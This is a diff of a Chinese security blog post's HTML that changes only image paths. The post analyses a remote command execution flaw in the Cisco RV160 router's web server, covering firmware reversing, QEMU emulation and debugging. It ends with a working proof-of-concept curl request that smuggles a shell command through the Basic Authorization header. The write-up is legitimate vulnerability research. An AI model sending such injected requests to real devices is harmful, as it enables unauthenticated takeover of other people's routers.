@@ -35,58 +35,58 @@
     <div class="post-content">
         <h1 id="Cisco-Rv160-远程命令执行"><a href="#Cisco-Rv160-远程命令执行" class="headerlink" title="Cisco Rv160 远程命令执行"></a>Cisco Rv160 远程命令执行</h1><h2 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h2><p><a target="_blank" rel="noopener" href="https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv160-260-rce-XZeFkNHf.html">https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv160-260-rce-XZeFkNHf.html</a></p>
 <h2 id="0x02-固件解包"><a href="#0x02-固件解包" class="headerlink" title="0x02 固件解包"></a>0x02 固件解包</h2><p>解开固件包，定位到mini_httpd 的web 组件</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202102701684.png" alt="image-20211202102701684"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202102701684.png" alt="image-20211202102701684"></p>
 <p>arm 架构</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202102835220.png" alt="image-20211202102835220"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202102835220.png" alt="image-20211202102835220"></p>
 <p>根据httpd 检索出了两个文件。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202103921752.png" alt="image-20211202103921752"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202103921752.png" alt="image-20211202103921752"></p>
 <h2 id="0x03-mini-httpd-分析"><a href="#0x03-mini-httpd-分析" class="headerlink" title="0x03 mini_httpd 分析"></a>0x03 mini_httpd 分析</h2><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p> 在进行IDA 分析cisco 160W 0.1 版本的mini_httpd 时，遇到了如下问题，但是并不影响反汇编F5。</p>
 <p>根据网上查阅的信息来看，这是因为栈帧不平衡，需要手动调整栈帧。</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DorinXL/p/13657972.html">https://www.cnblogs.com/DorinXL/p/13657972.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/feibabeibei_beibei/article/details/85238676">https://blog.csdn.net/feibabeibei_beibei/article/details/85238676</a></p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202110226642.png" alt="image-20211202110226642"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202110226642.png" alt="image-20211202110226642"></p>
 <h3 id="mini-httpd-分析"><a href="#mini-httpd-分析" class="headerlink" title="mini_httpd 分析"></a>mini_httpd 分析</h3><p>分析这个漏洞的时候，我并没有很仔细的查看漏洞相关分析文章，而是直接解开固件，进行分析，抱着一种如果当时是自己在分析这个固件，应该会从哪个方面入手的想法，是否可以发现漏洞点和漏洞触发的方式。</p>
 <p>接下来我将分享我对这个漏洞分析的逻辑与思路，首先我将mini_httpd 组件放入到IDA中，在逆向分析的过程中，由于对mini_httpd 源码已经大致看过了，因此，我对mini_httpd 组件的中的反汇编代码依次进行分析。</p>
 <p>根据上面的截图的 _libc_start_main()函数的定义，可以确定 mian 参数是 mini_httpd中的main 函数。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202144010024.png" alt="image-20211202144010024"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202144010024.png" alt="image-20211202144010024"></p>
 <p>根据mini_httpd组件中mini_httpd.c 的源码和本固件的mini_httpd 来对比，sub_11FA0() 函数就是mini_httpd.c 中的mian()函数。</p>
 <p>进入到sub_11FA0()函数中，可以看到mini_httpd 的版本是1.27的。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202144838659.png" alt="image-20211202144838659"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202144838659.png" alt="image-20211202144838659"></p>
 <p>在函数的底部找到了处理 进程的 handle_request() 函数。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202223259036.png" alt="image-20211202223259036"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202223259036.png" alt="image-20211202223259036"></p>
 <p>进入到handle_request，我根据mini_httpd.c 的源代码对比反汇编出来的handle_request 函数进行比对，找出mini_httpd中开发者二次开发的代码。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202224312529.png" alt="image-20211202224312529"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202224312529.png" alt="image-20211202224312529"></p>
 <p>根据 mini_httpd.c 中的hand_request() 函数源码来看，mini_httpd 反汇编出来的代码并没有 do_dir() 函数。</p>
 <p>在跟进了mini_httpd.c 中的do_dir()函数的代码后，do_dir()函数通过调用auth_check()函数处理当前访问的文件路径是否符合访问权限。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202230935935.png" alt="image-20211202230935935"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202230935935.png" alt="image-20211202230935935"></p>
 <p>进入到 do_file() 函数中，这个函数有两个要值得注意的点，首先在mini_http.c 源代码中，有一个auth_check()函数，该函数适用于对文件进行权限认证的函数，只有经过权限认证后，才能访问其他的文件，但是在Cisco RV160 的组件Mini_httpd的反汇编代码do_file()并没有这个函数，因此埋下了后面不需要认证即可出发漏洞的隐患。另一个是sub_1A58() 函数，这个函数在min_httpd.c中并不真实存在，因而这个函数是开发者二次开发留下的代码，传入dword_35164 的值作为参数。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202233311868.png" alt="image-20211202233311868"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202233311868.png" alt="image-20211202233311868"></p>
 <p>进入到sub_1AF58() 函数，该函数最终会将传入的dword_35164的值给v5, 然后将格式化的字符串调用system 函数进行执行。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206220714253.png" alt="image-20211206220714253"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206220714253.png" alt="image-20211206220714253"></p>
 <h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据前面的Cisco Rv160W 固件中mini_httpd和mini_httpd.c 源代码进行比对分析。在sub_1AF58() 函数中存在执行命令的漏洞，并且需要到达漏洞函数sub_1AF58()，函数的参数dword_35164 中要有 “ download&#x2F; “  字符串，才能跳转到do_file() 函数</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206222751530.png" alt="image-20211206222751530"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206222751530.png" alt="image-20211206222751530"></p>
 <p>接个根据参数往上一层追溯，该函数的参数dword_35164 中要有 “ dniapi&#x2F; “  字符串，才能跳转到do_file() 函数，根据上面strncmp函数，可以判定参数的格式为”&#x2F;download&#x2F;dniapi”</p>
 <blockquote>
 <p><strong>char *strstr(const char *haystack, const char *needle)</strong> 在字符串 <strong>haystack</strong> 中查找第一次出现字符串 <strong>needle</strong> 的位置，不包含终止符 ‘\0’</p>
 </blockquote>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206222553826.png" alt="image-20211206222553826"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206222553826.png" alt="image-20211206222553826"></p>
 <p>在dword_34F60 的值将赋值给dword_35164。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206223618352.png" alt="image-20211206223618352"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206223618352.png" alt="image-20211206223618352"></p>
 <p>而dword_34F60 的值则在如下的代码中进行解析，这个部分的代码在mini_httpd.c 中是一样的。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206223847690.png" alt="image-20211206223847690"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206223847690.png" alt="image-20211206223847690"></p>
 <p>接下来分析在sub_1AF58()函数中的漏洞点，其中dword_35180的值是Authorization的值，而获取的值中要包含 “ Basic ” 字符串。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206225203066.png" alt="image-20211206225203066"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206225203066.png" alt="image-20211206225203066"></p>
 <p>Authorization:</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206225023028.png" alt="image-20211206225023028"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206225023028.png" alt="image-20211206225023028"></p>
 <h2 id="0x05-环境搭建"><a href="#0x05-环境搭建" class="headerlink" title="0x05 环境搭建"></a>0x05 环境搭建</h2><p>首先查看文件系统的指令架构，文件系统位ARM </p>
 <figure class="highlight plaintext"><figcaption><span>~/i/g/c/_/_/_/_/_/u/4/r/bin> file ./busybox</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 2.6.16, stripped</span><br></pre></td></tr></table></figure>
 
 <p>配置qemu 之前的环境</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~&gt; cat /etc/network/interfaces</span><br><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">#up ifconfig eth0 0.0.0.0 up</span><br><span class="line">#auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> bridge_ports eth0</span><br><span class="line"> bridge_maxwait 0</span><br><span class="line"></span><br><span class="line">tigerortiger@ubuntu ~&gt; cat /etc/qemu-ifup</span><br><span class="line">#! /bin/sh</span><br><span class="line"># Script to bring a network (tap) device for qemu up.</span><br><span class="line"># The idea is to add the tap device to the same bridge</span><br><span class="line"># as we have default routing to.</span><br><span class="line"></span><br><span class="line"># in order to be able to find brctl</span><br><span class="line">echo &quot;Execute /etc/qemu-ifup&quot;</span><br><span class="line">#sudo ifdown eth0</span><br><span class="line">#sudo ifup br0</span><br><span class="line">echo &quot;Bringing up $1 for bridge mode..&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;adding $1 to br0&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 2</span><br><span class="line">tigerortiger@ubuntu ~&gt; sudo /etc/init.d/networking restart </span><br><span class="line">[ ok ] Restarting networking (via systemctl): networking.service.</span><br><span class="line">tigerortiger@ubuntu ~&gt; sudo ifdown eth0 </span><br><span class="line">Killed old client process</span><br><span class="line">Internet Systems Consortium DHCP Client 4.3.5</span><br><span class="line">Copyright 2004-2016 Internet Systems Consortium.</span><br><span class="line">All rights reserved.</span><br><span class="line">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class="line"></span><br><span class="line">Listening on LPF/eth0/00:0c:29:e5:1b:a2</span><br><span class="line">Sending on   LPF/eth0/00:0c:29:e5:1b:a2</span><br><span class="line">Sending on   Socket/fallback</span><br><span class="line">DHCPRELEASE on eth0 to 192.168.214.254 port 67 (xid=0x4c602cbd)</span><br><span class="line">tigerortiger@ubuntu ~&gt; sudo ifup br0</span><br><span class="line">Internet Systems Consortium DHCP Client 4.3.5</span><br><span class="line">Copyright 2004-2016 Internet Systems Consortium.</span><br><span class="line">All rights reserved.</span><br><span class="line">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class="line"></span><br><span class="line">Listening on LPF/br0/00:0c:29:e5:1b:a2</span><br><span class="line">Sending on   LPF/br0/00:0c:29:e5:1b:a2</span><br><span class="line">Sending on   Socket/fallback</span><br><span class="line">DHCPDISCOVER on br0 to 255.255.255.255 port 67 interval 3 (xid=0xd8f3411e)</span><br><span class="line">DHCPREQUEST of 192.168.214.129 on br0 to 255.255.255.255 port 67 (xid=0x1e41f3d8)</span><br><span class="line">DHCPOFFER of 192.168.214.129 from 192.168.214.254</span><br><span class="line">DHCPACK of 192.168.214.129 from 192.168.214.254</span><br><span class="line">bound to 192.168.214.129 -- renewal in 852 seconds.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207142457380.png" alt="image-20211207142457380"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207142457380.png" alt="image-20211207142457380"></p>
 <p>配置IP，保证qemu 和宿主机网络能畅通。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207143748443.png" alt="image-20211207143748443"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207143748443.png" alt="image-20211207143748443"></p>
 <p>把固件文件系统拷贝到qemu 中。</p>
 <figure class="highlight plaintext"><figcaption><span>~/i/g/c/_/_/_/_/_/u/454748969 [1]> pwd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/tigerortiger/iot/gujian/cisco/_RV16X_26X-v1.0.01.01-2020-08-17-11-09-01-AM.img.extracted/_40.extracted/_fw.gz.extracted/_0.extracted/_openwrt-comcerto2000-hgw-rootfs-ubi_nand.img.extracted/ubifs-root/454748969</span><br><span class="line">tigerortiger@ubuntu ~/i/g/c/_/_/_/_/_/u/454748969&gt; scp -r ./rootfs root@192.168.214.130:/root/</span><br></pre></td></tr></table></figure>
 
@@ -100,13 +100,13 @@
 <p>mount 设备文件名 挂载点</p>
 </blockquote>
 <p>chroot 出现了错误。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207173855519.png" alt="image-20211207173855519"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207173855519.png" alt="image-20211207173855519"></p>
 <p> chroot: failed to run command &#96;.&#x2F;bin&#x2F;sh’: Permission denied</p>
 <p>解决方案</p>
 <p>chmod -R 777 .&#x2F;cisco_RV160</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207173949545.png" alt="image-20211207173949545"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207173949545.png" alt="image-20211207173949545"></p>
 <p>启动mini_httpd.init 文件。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207201528596.png" alt="image-20211207201528596"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207201528596.png" alt="image-20211207201528596"></p>
 <figure class="highlight plaintext"><figcaption><span>#</span><a href="/etc/init.d/mini_httpd.init">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/ # /etc/init.d/mini_httpd.init </span><br><span class="line">uci: Entry not found</span><br><span class="line">Syntax: /etc/init.d/mini_httpd.init [command]</span><br><span class="line"></span><br><span class="line">Available commands:</span><br><span class="line">	start	Start the service</span><br><span class="line">	stop	Stop the service</span><br><span class="line">	restart	Restart the service</span><br><span class="line">	reload	Reload configuration files (or restart if that fails)</span><br><span class="line">	enable	Enable service autostart</span><br><span class="line">	disable	Disable service autostart</span><br><span class="line"></span><br><span class="line">/ # /etc/init.d/mini_httpd.init start</span><br><span class="line">uci: Entry not found</span><br><span class="line">ls: /mnt/configcert/confd/startup/: No such file or directory</span><br><span class="line">use backup cert for mini-httpd ...</span><br><span class="line">1 0 0 0</span><br><span class="line">setsockopt SO_REUSEADDR: Protocol not available</span><br><span class="line">setsockopt SO_REUSEADDR: Protocol not available</span><br><span class="line">/usr/sbin/mini_httpd: can&#x27;t bind to any address</span><br></pre></td></tr></table></figure>
 
 <p>根据执行mini_httpd.init 的报错信息来看，setsockopt()函数调用时报错,这个函数的定义如下。</p>
@@ -116,7 +116,7 @@
 </blockquote>
 <p>这里我们直接使用加载LD_PRELOAD 来进行hook，这里要注意的是hook和setsockopt一样的函数，包括名称、变量及类型、返回值及类型等。</p>
 <p>查看mini_httpd 中setsockopt函数的定义</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207215016628.png" alt="image-20211207215016628"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207215016628.png" alt="image-20211207215016628"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line"></span><br><span class="line">/* arm-linux-gnueabi-gcc -shared -fPIC hook_setsockopt.c -o hooksetsockopt  */</span><br><span class="line">int setsockopt(int fd, int level, int optname, const void *optval, socklen_t optlen)</span><br><span class="line">&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>编译hook_setsockopt.c </p>
@@ -124,15 +124,15 @@
 <p>启动 mini_httpd</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@debian-armhf:~/cisco_rv160# chroot . ./bin/sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.23.2 (2020-08-17 10:59:42 IST) built-in shell (ash)</span><br><span class="line"></span><br><span class="line">/ # ls</span><br><span class="line">bin              media            root             usr</span><br><span class="line">dev              mnt              sbin             var</span><br><span class="line">etc              overlay          sys              www</span><br><span class="line">hook_setsockopt  proc             test_scripts</span><br><span class="line">lib              rom              tmp</span><br><span class="line">/ # LD_PRELOAD=&quot;/hook_setsockopt&quot; ./usr/sbin/mini_httpd -p 8009</span><br><span class="line">bind: Address already in use</span><br><span class="line">/ # ./usr/sbin/mini_httpd: started as root without requesting chroot(), warning only</span><br><span class="line"></span><br><span class="line">/ # exit</span><br><span class="line">root@debian-armhf:~/cisco_rv160# ps -ef | grep &quot;mini_httpd&quot;</span><br><span class="line">root      2606     1  0 11:42 ?        00:00:00 ./usr/sbin/mini_httpd</span><br><span class="line">root      2608  2324 20 11:43 ttyAMA0  00:00:00 grep mini_httpd</span><br><span class="line">root@debian-armhf:~/cisco_rv160# lsof -i:8009</span><br><span class="line">COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">mini_http 3222 root    3u  IPv6   6465      0t0  TCP *:8009 (LISTEN)</span><br></pre></td></tr></table></figure>
 
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208165707403.png" alt="image-20211208165707403"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208165707403.png" alt="image-20211208165707403"></p>
 <p>batch</p>
 <p>ARM 汇编的NOP 指令是 mov r0,r0 。直接patch sub_1B5F0 为NOP, 这样就不会报错了，程序继续往下执行。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208104529045.png" alt="image-20211208104529045"></p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208104402863.png" alt="image-20211208104402863"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208104529045.png" alt="image-20211208104529045"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208104402863.png" alt="image-20211208104402863"></p>
 <p>重新启动mini_http 组件，可以看到设备的访问界面了。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=&quot;/hook_setsockopt&quot; ./usr/sbin/mini_http_hook -p 9009</span><br></pre></td></tr></table></figure>
 
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208171114599.png" alt="image-20211208171114599"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208171114599.png" alt="image-20211208171114599"></p>
 <h2 id="0x06-远程调试漏洞"><a href="#0x06-远程调试漏洞" class="headerlink" title="0x06 远程调试漏洞"></a>0x06 远程调试漏洞</h2><p>开启远程调试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@debian-armhf:~/cisco_rv160# ps -ef | grep &quot;mini_http_hook&quot;</span><br><span class="line">root      3351     1  0 20:32 ?        00:00:00 ./usr/sbin/mini_http_hook -p 8009</span><br><span class="line">root      3354  2324  0 20:33 ttyAMA0  00:00:00 grep mini_http_hook</span><br><span class="line">root@debian-armhf:~/cisco_rv160# ./gdbserver :1234 --attach 3351</span><br><span class="line">Attached; pid = 3351</span><br><span class="line">Listening on port 1234</span><br></pre></td></tr></table></figure>
 
@@ -144,11 +144,11 @@
 <p>发送POC</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET -H &#x27;Authorization: Basic O3RvdWNoIC90bXAvaGFwcHloYWNraW5nOwoK&#x27; -i &#x27;http://192.168.214.130:8009/download/dniapi/</span><br></pre></td></tr></table></figure>
 
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209223721558.png" alt="image-20211209223721558"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209223721558.png" alt="image-20211209223721558"></p>
 <p>断点到0x001b11c 处，可以看到我们拼接的字符串“ ;touch &#x2F;tmp&#x2F;happyhacking;”</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209224214203.png" alt="image-20211209224214203"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209224214203.png" alt="image-20211209224214203"></p>
 <p>执行完了之后，成功执行命令。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209224458063.png" alt="image-20211209224458063"></p>
